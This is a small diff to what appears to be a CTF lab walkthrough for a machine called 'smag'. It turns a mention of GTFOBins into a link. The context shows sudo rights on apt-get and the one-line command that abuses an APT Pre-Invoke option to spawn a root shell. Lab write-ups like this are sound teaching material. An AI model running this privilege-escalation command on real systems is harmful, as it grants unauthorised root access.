@@ -98,7 +98,7 @@ Matching Defaults entries for jake on smag:
 User jake may run the following commands on smag:
     (ALL : ALL) NOPASSWD: /usr/bin/apt-get
 ```
-So just go to GTFOBins and find `apt-get`   
+So just go to [GTFOBins](https://gtfobins.github.io/) and find `apt-get`   
 ![alt text](https://i.imgur.com/qd1AJlB.png)   
 Just run `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` and you will get root shell.   
 ![alt text](https://i.imgur.com/4dXK1YU.png)
